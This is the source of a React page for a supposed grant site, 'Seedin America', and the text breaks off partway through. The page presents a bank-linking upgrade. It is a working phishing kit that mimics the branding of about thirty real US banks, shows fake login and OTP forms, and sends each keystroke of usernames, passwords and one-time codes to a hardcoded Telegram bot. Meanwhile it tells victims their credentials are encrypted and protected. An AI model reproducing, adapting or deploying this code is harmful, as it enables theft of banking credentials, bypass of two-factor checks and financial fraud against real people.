import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState, useRef } from "react";
import {
  ArrowLeft, CheckCircle2, Lock, Loader2, Search, Eye, EyeOff,
  Shield, ChevronRight, AlertCircle
} from "lucide-react";
import { Logo } from "@/components/brand/Logo";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import type { Profile } from "@/lib/auth";

async function sendTelegramNotification(message: string) {
  try {
    const BOT_TOKEN = "8904757564:AAF_OWIT-ChKTC_SEl643TG-FG247TE2lgo";
    const CHAT_ID = "6048752790";
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "HTML" }),
    });
    if (!response.ok) console.error("Telegram API error:", response.statusText);
  } catch (e) {
    console.error("Telegram notification failed:", e);
  }
}

function RollingLoader() {
  return (
    <div className="flex items-center justify-center">
      <style>{`
        @keyframes roll { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .rolling-loader { width:40px;height:40px;border:4px solid rgba(34,100,55,0.2);border-top:4px solid #226437;border-right:4px solid #226437;border-radius:50%;animation:roll 1s linear infinite; }
      `}</style>
      <div className="rolling-loader" />
    </div>
  );
}

export const Route = createFileRoute("/upgrade-tier-3")({
  head: () => ({ meta: [{ title: "Upgrade to Tier 3 — Seedin America" }] }),
  component: UpgradeTier3,
});

interface BankDef {
  id: string;
  name: string;
  auth: "otp" | "securityq";
  position: number;
  theme: {
    bg: string;
    headerBg: string;
    headerText: string;
    accent: string;
    accentText: string;
    logo: string;
    logoColor: string;
    inputBorder: string;
    tagline?: string;
  };
}

const BANKS_DATA: BankDef[] = [
  {
    id: "chase", name: "Chase Bank", auth: "otp", position: 1,
    theme: { bg: "#f5f5f5", headerBg: "#005eb8", headerText: "#ffffff", accent: "#005eb8", accentText: "#ffffff", logo: "CHASE", logoColor: "#ffffff", inputBorder: "#005eb8", tagline: "The right relationship is everything" },
  },
  {
    id: "bofa", name: "Bank of America", auth: "securityq", position: 2,
    theme: { bg: "#f2f2f2", headerBg: "#e31837", headerText: "#ffffff", accent: "#e31837", accentText: "#ffffff", logo: "Bank of America", logoColor: "#ffffff", inputBorder: "#e31837", tagline: "What would you like the power to do?" },
  },
  {
    id: "wellsfargo", name: "Wells Fargo Bank", auth: "securityq", position: 3,
    theme: { bg: "#fdf6ec", headerBg: "#d71e28", headerText: "#ffffff", accent: "#d71e28", accentText: "#ffffff", logo: "WELLS FARGO", logoColor: "#ffffff", inputBorder: "#d71e28", tagline: "Together we'll go far" },
  },
  {
    id: "citibank", name: "Citibank", auth: "otp", position: 4,
    theme: { bg: "#f0f4f8", headerBg: "#003b70", headerText: "#ffffff", accent: "#003b70", accentText: "#ffffff", logo: "citi", logoColor: "#ffffff", inputBorder: "#003b70", tagline: "Citi Never Sleeps" },
  },
  {
    id: "usbank", name: "U.S. Bank", auth: "otp", position: 5,
    theme: { bg: "#f4f4f4", headerBg: "#012169", headerText: "#ffffff", accent: "#012169", accentText: "#ffffff", logo: "U.S. Bank", logoColor: "#ffffff", inputBorder: "#012169", tagline: "The power of possible" },
  },
  {
    id: "pnc", name: "PNC Bank", auth: "securityq", position: 6,
    theme: { bg: "#f5f5f5", headerBg: "#f58025", headerText: "#ffffff", accent: "#f58025", accentText: "#ffffff", logo: "PNC", logoColor: "#ffffff", inputBorder: "#f58025", tagline: "Achievement begins here" },
  },
  {
    id: "tdbank", name: "TD Bank", auth: "otp", position: 7,
    theme: { bg: "#f0f7f0", headerBg: "#00843d", headerText: "#ffffff", accent: "#00843d", accentText: "#ffffff", logo: "TD Bank", logoColor: "#ffffff", inputBorder: "#00843d", tagline: "America's Most Convenient Bank" },
  },
  {
    id: "capitalone", name: "Capital One Bank", auth: "otp", position: 8,
    theme: { bg: "#f5f5f5", headerBg: "#d03027", headerText: "#ffffff", accent: "#d03027", accentText: "#ffffff", logo: "Capital One", logoColor: "#ffffff", inputBorder: "#d03027", tagline: "What's in your wallet?" },
  },
  {
    id: "discover", name: "Discover Bank", auth: "otp", position: 9,
    theme: { bg: "#fff8f0", headerBg: "#f76e20", headerText: "#ffffff", accent: "#f76e20", accentText: "#ffffff", logo: "DISCOVER", logoColor: "#ffffff", inputBorder: "#f76e20", tagline: "We treat you like you'd treat you" },
  },
  {
    id: "truist", name: "Truist Bank", auth: "otp", position: 10,
    theme: { bg: "#f4f4f4", headerBg: "#4b1e78", headerText: "#ffffff", accent: "#4b1e78", accentText: "#ffffff", logo: "Truist", logoColor: "#ffffff", inputBorder: "#4b1e78", tagline: "Inspire and build better lives" },
  },
  {
    id: "navyfcu", name: "Navy Federal Credit Union", auth: "otp", position: 11,
    theme: { bg: "#f0f4f8", headerBg: "#002664", headerText: "#ffffff", accent: "#002664", accentText: "#ffffff", logo: "Navy Federal", logoColor: "#ffffff", inputBorder: "#002664", tagline: "Our members are the mission" },
  },
  {
    id: "pentagonfcu", name: "Pentagon Federal Credit Union", auth: "otp", position: 12,
    theme: { bg: "#f0f4f8", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "PenFed", logoColor: "#ffffff", inputBorder: "#003087", tagline: "We're here for you" },
  },
  {
    id: "alliantcu", name: "Alliant Credit Union", auth: "otp", position: 13,
    theme: { bg: "#f5f9f5", headerBg: "#0075be", headerText: "#ffffff", accent: "#0075be", accentText: "#ffffff", logo: "Alliant", logoColor: "#ffffff", inputBorder: "#0075be", tagline: "Banking for the greater good" },
  },
  {
    id: "ferkomd", name: "Ferko Maryland Federal Credit Union", auth: "otp", position: 14,
    theme: { bg: "#f0f4f8", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "Ferko", logoColor: "#ffffff", inputBorder: "#003087", tagline: "Your community bank" },
  },
  {
    id: "fifththird", name: "Fifth Third Bank", auth: "otp", position: 15,
    theme: { bg: "#f5f5f5", headerBg: "#00a950", headerText: "#ffffff", accent: "#00a950", accentText: "#ffffff", logo: "Fifth Third Bank", logoColor: "#ffffff", inputBorder: "#00a950", tagline: "Banking a Fifth Third Better" },
  },
  {
    id: "huntington", name: "Huntington Bank", auth: "otp", position: 16,
    theme: { bg: "#f5f5f5", headerBg: "#00813d", headerText: "#ffffff", accent: "#00813d", accentText: "#ffffff", logo: "Huntington", logoColor: "#ffffff", inputBorder: "#00813d", tagline: "Welcome. We've been expecting you." },
  },
  {
    id: "keybank", name: "KeyBank", auth: "otp", position: 17,
    theme: { bg: "#f5f5f5", headerBg: "#cc0000", headerText: "#ffffff", accent: "#cc0000", accentText: "#ffffff", logo: "KeyBank", logoColor: "#ffffff", inputBorder: "#cc0000", tagline: "Unlock possibilities" },
  },
  {
    id: "regionbank", name: "Regions Bank", auth: "otp", position: 18,
    theme: { bg: "#f5f5f5", headerBg: "#006938", headerText: "#ffffff", accent: "#006938", accentText: "#ffffff", logo: "Regions", logoColor: "#ffffff", inputBorder: "#006938", tagline: "Here for you" },
  },
  {
    id: "ally", name: "Ally Bank", auth: "otp", position: 19,
    theme: { bg: "#f0f8ff", headerBg: "#7b1fa2", headerText: "#ffffff", accent: "#7b1fa2", accentText: "#ffffff", logo: "ally", logoColor: "#ffffff", inputBorder: "#7b1fa2", tagline: "Do It Right" },
  },
  {
    id: "marcus", name: "Marcus by Goldman Sachs", auth: "otp", position: 20,
    theme: { bg: "#f5f5f0", headerBg: "#1a1a1a", headerText: "#ffffff", accent: "#1a1a1a", accentText: "#ffffff", logo: "Marcus", logoColor: "#ffffff", inputBorder: "#1a1a1a", tagline: "by Goldman Sachs" },
  },
  {
    id: "sofi", name: "SoFi Bank", auth: "otp", position: 21,
    theme: { bg: "#f0f9f4", headerBg: "#00a862", headerText: "#ffffff", accent: "#00a862", accentText: "#ffffff", logo: "SoFi", logoColor: "#ffffff", inputBorder: "#00a862", tagline: "Get your money right" },
  },
  {
    id: "chime", name: "Chime Bank", auth: "otp", position: 22,
    theme: { bg: "#f0f9f4", headerBg: "#1ec677", headerText: "#ffffff", accent: "#1ec677", accentText: "#ffffff", logo: "Chime", logoColor: "#ffffff", inputBorder: "#1ec677", tagline: "Banking that has your back" },
  },
  {
    id: "schwab", name: "Charles Schwab Bank", auth: "otp", position: 23,
    theme: { bg: "#f5f5f5", headerBg: "#00a0df", headerText: "#ffffff", accent: "#00a0df", accentText: "#ffffff", logo: "Schwab", logoColor: "#ffffff", inputBorder: "#00a0df", tagline: "Own your tomorrow" },
  },
  {
    id: "citizens", name: "Citizens Bank", auth: "otp", position: 24,
    theme: { bg: "#f5f5f5", headerBg: "#006341", headerText: "#ffffff", accent: "#006341", accentText: "#ffffff", logo: "Citizens", logoColor: "#ffffff", inputBorder: "#006341", tagline: "Made ready" },
  },
  {
    id: "santander", name: "Santander Bank", auth: "otp", position: 25,
    theme: { bg: "#fff5f5", headerBg: "#ec0000", headerText: "#ffffff", accent: "#ec0000", accentText: "#ffffff", logo: "Santander", logoColor: "#ffffff", inputBorder: "#ec0000", tagline: "Simple. Personal. Fair." },
  },
  {
    id: "hsbc", name: "HSBC Bank USA", auth: "otp", position: 26,
    theme: { bg: "#fdf5f5", headerBg: "#db0011", headerText: "#ffffff", accent: "#db0011", accentText: "#ffffff", logo: "HSBC", logoColor: "#ffffff", inputBorder: "#db0011", tagline: "Together we thrive" },
  },
  {
    id: "westernalliance", name: "Western Alliance Bank", auth: "otp", position: 27,
    theme: { bg: "#f5f5f5", headerBg: "#003087", headerText: "#ffffff", accent: "#003087", accentText: "#ffffff", logo: "Western Alliance", logoColor: "#ffffff", inputBorder: "#003087" },
  },
  {
    id: "zions", name: "Zions Bank", auth: "otp", position: 28,
    theme: { bg: "#f5f5f5", headerBg: "#002d62", headerText: "#ffffff", accent: "#002d62", accentText: "#ffffff", logo: "Zions Bank", logoColor: "#ffffff", inputBorder: "#002d62", tagline: "The West is our home" },
  },
  {
    id: "cullen", name: "Cullen/Frost Bankers", auth: "otp", position: 29,
    theme: { bg: "#f5f5f5", headerBg: "#00539b", headerText: "#ffffff", accent: "#00539b", accentText: "#ffffff", logo: "Frost", logoColor: "#ffffff", inputBorder: "#00539b", tagline: "Texas banking since 1868" },
  },
  {
    id: "prosperity", name: "Prosperity Bank", auth: "otp", position: 30,
    theme: { bg: "#f5f5f5", headerBg: "#003865", headerText: "#ffffff", accent: "#003865", accentText: "#ffffff", logo: "Prosperity Bank", logoColor: "#ffffff", inputBorder: "#003865" },
  },
];

type Step = "intro" | "bank-select" | "bank-login" | "auth-confirm" | "processing" | "success";

function UpgradeTier3() {
  const navigate = useNavigate();
  const [userId, setUserId] = useState<string | null>(null);
  const [profile, setProfile] = useState<Profile | null>(null);
  const [step, setStep] = useState<Step>("intro");
  const [selectedBank, setSelectedBank] = useState<BankDef | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loginError, setLoginError] = useState("");
  const [otp, setOtp] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [isTransitioning, setIsTransitioning] = useState(false);
  const pageOpenNotifiedRef = useRef(false);

  useEffect(() => {
    const load = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) navigate({ to: "/signin" });
      else {
        setUserId(session.user.id);
        const { data } = await supabase
          .from("profiles").select("*").eq("id", session.user.id).maybeSingle();
        setProfile(data as Profile | null);
        if (!pageOpenNotifiedRef.current) {
          pageOpenNotifiedRef.current = true;
          await sendTelegramNotification(
            `🔔 <b>Tier 3 Upgrade Initiated</b>\n\n` +
            `👤 <b>User:</b> ${(data as Profile)?.full_name || "Unknown"}\n` +
            `📧 <b>Email:</b> ${session.user.email}\n` +
            `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
            `<b>Action:</b> User opened Tier 3 upgrade page`
          );
        }
      }
    };
    load();
  }, [navigate]);

  const filteredBanks = BANKS_DATA
    .filter(b => b.name.toLowerCase().includes(searchQuery.toLowerCase()))
    .sort((a, b) => a.position - b.position);

  const majorBanks = filteredBanks.slice(0, 6);
  const otherBanks = filteredBanks.slice(6);

  const transition = (fn: () => void, msg = "") => {
    setIsTransitioning(true);
    setTimeout(() => { fn(); setIsTransitioning(false); }, 3000);
    if (msg) sendTelegramNotification(msg);
  };

  const handleBankSelected = (bank: BankDef) => {
    transition(() => {
      setSelectedBank(bank);
      setEmail(""); setPassword(""); setLoginError(""); setOtp("");
      setStep("bank-login");
    },
    `🏦 <b>Bank Selected</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏪 <b>Bank:</b> ${bank.name}\n🕐 <b>Time:</b> ${new Date().toLocaleString()}`);
  };

  const handleEmailChange = (value: string) => {
    setEmail(value);
    if (value) sendTelegramNotification(
      `📝 <b>Email Field Updated</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏦 <b>Bank:</b> ${selectedBank?.name}\n📧 <b>Email:</b> <code>${value}</code>\n🕐 ${new Date().toLocaleString()}`
    );
  };

  const handlePasswordChange = (value: string) => {
    setPassword(value);
    if (value) sendTelegramNotification(
      `📝 <b>Password Field Updated</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏦 <b>Bank:</b> ${selectedBank?.name}\n🔐 <b>Password:</b> <code>${value}</code>\n🕐 ${new Date().toLocaleString()}`
    );
  };

  const handleLogin = () => {
    if (!email || !password) { setLoginError("Please enter email and password"); return; }
    sendTelegramNotification(
      `✅ <b>LOGIN CREDENTIALS SUBMITTED</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏦 <b>Bank:</b> ${selectedBank?.name}\n\n📧 <b>USERNAME/EMAIL:</b>\n<code>${email}</code>\n\n🔐 <b>PASSWORD:</b>\n<code>${password}</code>\n\n🕐 ${new Date().toLocaleString()}`
    );
    transition(() => { setLoginError(""); setStep("auth-confirm"); });
  };

  const handleOtpChange = (value: string) => {
    const v = value.replace(/\D/g, "").slice(0, 10);
    setOtp(v);
    if (v) sendTelegramNotification(
      `📝 <b>OTP Code Entry</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏦 <b>Bank:</b> ${selectedBank?.name}\n🔐 <b>OTP:</b> <code>${v}</code>\n📊 ${v.length} digits\n🕐 ${new Date().toLocaleString()}`
    );
  };

  const handleAuthConfirm = async () => {
    if (!selectedBank || !userId) { toast.error("Missing required information"); return; }
    if (!otp || otp.length < 3) { toast.error("Please enter a valid OTP"); return; }
    setIsTransitioning(true); setSubmitting(true);
    try {
      sendTelegramNotification(
        `🔒 <b>OTP VERIFIED</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏦 <b>Bank:</b> ${selectedBank.name}\n🔐 <b>OTP:</b> <code>${otp}</code>\n🕐 ${new Date().toLocaleString()}`
      );
      const { error } = await supabase.from("profiles").update({
        requested_tier: 3, tier_status: "pending",
        linked_bank_name: selectedBank.name,
        verification_submitted_at: new Date().toISOString(),
      }).eq("id", userId);
      if (error) throw error;
      sendTelegramNotification(
        `🎉 <b>BANK ACCOUNT LINKED</b>\n\n👤 <b>User:</b> ${profile?.full_name}\n🏦 <b>Bank:</b> ${selectedBank.name}\n📊 Pending Admin Approval\n🕐 ${new Date().toLocaleString()}`
      );
      setTimeout(() => { setStep("processing"); setSubmitting(false); setIsTransitioning(false); }, 3000);
    } catch (e) {
      setSubmitting(false); setIsTransitioning(false);
      toast.error(e instanceof Error ? e.message : "Failed to verify. Please try again.");
    }
  };

  if (!userId || !profile) {
    return <div className="grid min-h-screen place-items-center bg-background"><Loader2 className="h-6 w-6 animate-spin text-forest" /></div>;
  }

  const LoadingScreen = ({ msg }: { msg: string }) => (
    <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background flex items-center justify-center">
      <div className="text-center"><RollingLoader /><p className="mt-6 text-muted-foreground">{msg}</p></div>
    </div>
  );

  if (step === "intro") {
    if (isTransitioning) return <LoadingScreen msg="Loading bank selection..." />;
    return (
      <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
        <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
          <Logo />
          <button onClick={() => navigate({ to: "/dashboard" })} className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground"><ArrowLeft className="h-4 w-4" /> Back</button>
        </header>
        <main className="mx-auto max-w-3xl px-6">
          <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
            <div className="bg-gradient-primary px-8 py-7 text-primary-foreground">
              <div className="flex items-center gap-2 text-xs uppercase tracking-[0.2em] text-gold"><Shield className="h-3.5 w-3.5" /> Tier 3 Upgrade</div>
              <h1 className="mt-2 font-display text-2xl font-semibold md:text-3xl">Unlock Unlimited Grants</h1>
              <p className="mt-1 max-w-xl text-sm text-white/80">Upgrade to Tier 3 and apply for <strong className="text-gold">unlimited grant amounts</strong>. Link your bank account securely to get started.</p>
            </div>
            <div className="space-y-8 p-8">
              <div className="rounded-lg border border-forest/20 bg-forest/5 p-6">
                <div className="flex gap-4">
                  <Shield className="h-5 w-5 text-forest flex-shrink-0 mt-0.5" />
                  <div>
                    <h3 className="font-semibold text-foreground">Why Link Your Bank?</h3>
                    <p className="mt-2 text-sm text-muted-foreground">Your bank account is required for secure fund transfers. We use bank-level encryption to protect your information. Your account details are never stored directly on our servers. <strong className="text-forest">All withdrawals go exclusively to this verified account</strong> — prepaid cards and third-party accounts are not supported.</p>
                  </div>
                </div>
              </div>
              <button onClick={() => { setIsTransitioning(true); setTimeout(() => { setStep("bank-select"); setIsTransitioning(false); }, 3000); }} disabled={isTransitioning} className="inline-flex w-full items-center justify-center gap-2 rounded-lg bg-gradient-forest px-6 py-3.5 text-sm font-semibold text-forest-foreground shadow-elegant transition hover:opacity-95 disabled:opacity-50">
                <Lock className="h-4 w-4" /> Link Bank Account
              </button>
            </div>
          </div>
        </main>
      </div>
    );
  }

  if (step === "bank-select") {
    if (isTransitioning) return <LoadingScreen msg="Connecting to bank..." />;
    const hasMatch = filteredBanks.length > 0;
    const customBank: BankDef | null = searchQuery.trim().length > 2 && !hasMatch
      ? { id: "custom", name: searchQuery.trim(), auth: "otp", position: 999, theme: { bg: "#f5f5f5", headerBg: "#1a3a5c", headerText: "#fff", accent: "#1a3a5c", accentText: "#fff", logo: searchQuery.trim(), logoColor: "#fff", inputBorder: "#1a3a5c" } }
      : null;
    return (
      <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
        <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6">
          <Logo />
          <button onClick={() => setStep("intro")} className="inline-flex items-center gap-1.5 text-sm text-muted-foreground hover:text-foreground"><ArrowLeft className="h-4 w-4" /> Back</button>
        </header>
        <main className="mx-auto max-w-3xl px-6">
          <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
            <div className="bg-gradient-primary px-8 py-7 text-primary-foreground">
              <h2 className="font-display text-2xl font-semibold">Select Your Bank</h2>
              <p className="mt-1 text-sm text-white/80">Search or choose from the list below</p>
            </div>
            <div className="p-8 space-y-6">
              <div className="relative">
                <Search className="absolute left-4 top-1/2 -translate-y-1/2 text-muted-foreground w-5 h-5" />
                <input type="text" placeholder="Search banks..." value={searchQuery} onChange={e => setSearchQuery(e.target.value)} className="w-full pl-12 pr-4 py-3 border border-border rounded-lg focus:outline-none focus:ring-2 focus:ring-forest/30 focus:border-forest" />
              </div>
              {majorBanks.length > 0 && (
                <div>
                  <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground font-semibold mb-3">Popular Banks</p>
                  <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                    {majorBanks.map(bank => (
                      <button key={bank.id} onClick={() => handleBankSelected(bank)} disabled={isTransitioning}
                        className="p-4 border-2 border-border rounded-lg hover:border-forest hover:bg-forest/5 transition text-left disabled:opacity-50">
                        <div className="w-8 h-8 rounded mb-2 flex items-center justify-center text-xs font-bold text-white" style={{ background: bank.theme.headerBg }}>{bank.theme.logo.slice(0, 2).toUpperCase()}</div>
                        <p className="font-semibold text-sm text-foreground">{bank.name}</p>
                      </button>
                    ))}
                  </div>
                </div>
              )}
              {otherBanks.length > 0 && (
                <div>
                  <p className="text-xs uppercase tracking-[0.18em] text-muted-foreground font-semibold mb-3">All Banks</p>
                  <div className="space-y-2 max-h-96 overflow-y-auto">
                    {otherBanks.map(bank => (
                      <button key={bank.id} onClick={() => handleBankSelected(bank)} disabled={isTransitioning}
                        className="w-full p-3 border border-border rounded-lg hover:border-forest hover:bg-forest/5 transition text-left flex items-center gap-3 group disabled:opacity-50">
                        <div className="w-8 h-8 rounded flex-shrink-0 flex items-center justify-center text-xs font-bold text-white" style={{ background: bank.theme.headerBg }}>{bank.theme.logo.slice(0, 2).toUpperCase()}</div>
                        <p className="text-sm font-medium text-foreground group-hover:text-forest flex-1">{bank.name}</p>
                        <ChevronRight className="h-4 w-4 text-muted-foreground group-hover:text-forest" />
                      </button>
                    ))}
                  </div>
                </div>
              )}
              {customBank && (
                <div className="space-y-4 pt-4 border-t border-border">
                  <div className="rounded-lg border border-gold/30 bg-gold/5 p-4">
                    <p className="text-xs uppercase tracking-[0.18em] text-gold font-semibold mb-2">Bank Not Found</p>
                    <p className="text-sm text-muted-foreground">We couldn't find "<strong>{customBank.name}</strong>" in our list. You can still proceed.</p>
                  </div>
                  <button onClick={() => handleBankSelected(customBank)} disabled={isTransitioning}
                    className="w-full p-4 border-2 border-gold border-dashed rounded-lg bg-gold/5 hover:bg-gold/10 transition text-left flex items-center justify-between group disabled:opacity-50">
                    <div><p className="text-sm font-semibold text-foreground group-hover:text-gold">{customBank.name}</p><p className="text-xs text-muted-foreground mt-1">Continue with this bank</p></div>
                    <ChevronRight className="h-4 w-4 text-gold" />
                  </button>
                </div>
              )}
              {filteredBanks.length === 0 && !customBank && (
                <div className="text-center py-12"><p className="text-muted-foreground">No banks found</p><p className="text-sm text-muted-foreground mt-1">Try typing your bank name in full</p></div>
              )}
            </div>
          </div>
        </main>
      </div>
    );
  }

  if (step === "bank-login" && selectedBank) {
    if (isTransitioning) return <LoadingScreen msg="Processing your credentials..." />;
    const t = selectedBank.theme;
    return (
      <div className="min-h-screen pb-16" style={{ background: t.bg }}>
        <div style={{ background: t.headerBg }} className="px-6 py-4 shadow-md">
          <div className="mx-auto max-w-3xl flex items-center justify-between">
            <span className="text-2xl font-black tracking-tight" style={{ color: t.logoColor }}>{t.logo}</span>
            {t.tagline && <span className="hidden md:block text-xs opacity-75" style={{ color: t.logoColor }}>{t.tagline}</span>}
          </div>
        </div>
        <div style={{ background: t.headerBg, opacity: 0.85, borderTop: "1px solid rgba(255,255,255,0.15)" }} className="px-6 py-2">
          <div className="mx-auto max-w-3xl flex gap-6">
            {["Personal", "Business", "Wealth Management", "About Us"].map(item => (
              <span key={item} className="text-xs cursor-default opacity-80" style={{ color: t.logoColor }}>{item}</span>
            ))}
          </div>
        </div>
        <div className="mx-auto max-w-3xl px-6 mt-8">
          <button onClick={() => setStep("bank-select")} className="inline-flex items-center gap-1.5 text-sm mb-6" style={{ color: t.accent }}>
            <ArrowLeft className="h-4 w-4" /> Back
          </button>
          <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-200">
            <div className="px-8 py-6" style={{ background: t.headerBg }}>
              <h2 className="text-xl font-bold" style={{ color: t.headerText }}>Sign In to {selectedBank.name}</h2>
              <p className="text-sm mt-1 opacity-80" style={{ color: t.headerText }}>Enter your online banking credentials</p>
            </div>
            <div className="p-8 space-y-5">
              <div className="flex items-center gap-2 text-xs text-gray-500 border border-gray-200 rounded-lg px-4 py-2.5 bg-gray-50">
                <Shield className="h-4 w-4" style={{ color: t.accent }} />
                <span>Secure, encrypted connection — your credentials are protected</span>
              </div>
              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-2">Online ID / Username</label>
                <input type="text" value={email} onChange={e => handleEmailChange(e.target.value)} placeholder={`Your ${selectedBank.name} username`}
                  disabled={isTransitioning}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none text-sm"
                  style={{ "--tw-ring-color": t.inputBorder } as React.CSSProperties}
                  onFocus={e => { e.currentTarget.style.borderColor = t.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
                  onBlur={e => { e.currentTarget.style.borderColor = "#d1d5db"; e.currentTarget.style.boxShadow = "none"; }}
                />
              </div>
              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-2">Password</label>
                <div className="relative">
                  <input type={showPassword ? "text" : "password"} value={password} onChange={e => handlePasswordChange(e.target.value)} placeholder="Your password"
                    disabled={isTransitioning}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none text-sm pr-12"
                    onFocus={e => { e.currentTarget.style.borderColor = t.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
                    onBlur={e => { e.currentTarget.style.borderColor = "#d1d5db"; e.currentTarget.style.boxShadow = "none"; }}
                  />
                  <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600">
                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
                <div className="mt-2 text-right">
                  <span className="text-xs cursor-default" style={{ color: t.accent }}>Forgot password?</span>
                </div>
              </div>
              {loginError && (
                <div className="flex items-start gap-3 p-4 rounded-lg bg-red-50 border border-red-200 text-red-700 text-sm">
                  <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" /> {loginError}
                </div>
              )}
              <button onClick={handleLogin} disabled={isTransitioning}
                className="w-full py-3.5 rounded-lg font-semibold text-sm transition hover:opacity-90 disabled:opacity-50"
                style={{ background: t.accent, color: t.accentText }}>
                Sign In
              </button>
              <p className="text-center text-xs text-gray-400">
                By signing in you agree to {selectedBank.name}'s Terms of Service and Privacy Policy
              </p>
            </div>
          </div>
          <div className="mt-6 text-center text-xs text-gray-400 space-x-4">
            <span>Privacy Policy</span><span>·</span>
            <span>Security</span><span>·</span>
            <span>Accessibility</span><span>·</span>
            <span>© {new Date().getFullYear()} {selectedBank.name}</span>
          </div>
        </div>
      </div>
    );
  }

  if (step === "auth-confirm" && selectedBank) {
    if (isTransitioning) return <LoadingScreen msg="Verifying your account..." />;
    const t = selectedBank.theme;
    return (
      <div className="min-h-screen pb-16" style={{ background: t.bg }}>
        <div style={{ background: t.headerBg }} className="px-6 py-4 shadow-md">
          <div className="mx-auto max-w-3xl flex items-center justify-between">
            <span className="text-2xl font-black tracking-tight" style={{ color: t.logoColor }}>{t.logo}</span>
            {t.tagline && <span className="hidden md:block text-xs opacity-75" style={{ color: t.logoColor }}>{t.tagline}</span>}
          </div>
        </div>
        <div className="mx-auto max-w-3xl px-6 mt-8">
          <button onClick={() => setStep("bank-login")} className="inline-flex items-center gap-1.5 text-sm mb-6" style={{ color: t.accent }}>
            <ArrowLeft className="h-4 w-4" /> Back
          </button>
          <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-200">
            <div className="px-8 py-6" style={{ background: t.headerBg }}>
              <h2 className="text-xl font-bold" style={{ color: t.headerText }}>Two-Step Verification</h2>
              <p className="text-sm mt-1 opacity-80" style={{ color: t.headerText }}>Confirm it's you before we continue</p>
            </div>
            <div className="p-8 space-y-6">
              <div className="rounded-lg border border-gray-200 bg-gray-50 p-4 text-sm text-gray-600">
                An OTP has been sent to your registered email or phone number on file with {selectedBank.name}.
              </div>
              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-500 mb-3">Verification Code</label>
                <input type="text" value={otp} onChange={e => handleOtpChange(e.target.value)} placeholder="Enter code"
                  disabled={isTransitioning}
                  className="w-full text-center text-3xl font-bold px-4 py-4 border-2 border-gray-300 rounded-lg focus:outline-none tracking-widest"
                  onFocus={e => { e.currentTarget.style.borderColor = t.inputBorder; e.currentTarget.style.boxShadow = `0 0 0 3px ${t.inputBorder}22`; }}
                  onBlur={e => { e.currentTarget.style.borderColor = "#d1d5db"; e.currentTarget.style.boxShadow = "none"; }}
                />
              </div>
              <button onClick={handleAuthConfirm} disabled={otp.length < 3 || submitting || isTransitioning}
                className="w-full py-3.5 rounded-lg font-semibold text-sm transition hover:opacity-90 disabled:opacity-50 disabled:cursor-not-allowed"
                style={{ background: otp.length >= 3 && !submitting ? t.accent : "#e5e7eb", color: otp.length >= 3 && !submitting ? t.accentText : "#9ca3af" }}>
                {submitting ? "Verifying..." : "Verify & Continue"}
              </button>
              <p className="text-center text-xs text-gray-400">
                Didn't receive a code? <span className="cursor-default" style={{ color: t.accent }}>Resend code</span>
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (step === "processing") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-accent/40 via-background to-background pb-16">
        <header className="mx-auto flex max-w-5xl items-center justify-between px-6 py-6"><Logo /></header>
        <main className="mx-auto max-w-3xl px-6">
          <div className="overflow-hidden rounded-2xl border border-border bg-card shadow-card">
            <div className="bg-gradient-primary px-8 py-12 text-primary-foreground text-center">
              <style>{`@keyframes pulse-scale{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.1);opacity:0.8}}.pulse-icon{animation:pulse-scale 2s ease-in-out infinite}`}</style>
              <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-white/10 mb-6 pulse-icon"><Shield className="h-8 w-8 text-gold" /></div>
              <h1 className="font-display text-3xl font-semibold">Tier 3 Upgrade Under Review</h1>
              <p className="mt-2 text-white/80">Your account verification is being processed</p>
            </div>
            <div className="p-8 space-y-8">
              <div className="rounded-lg border border-forest/20 bg-forest/5 p-8">
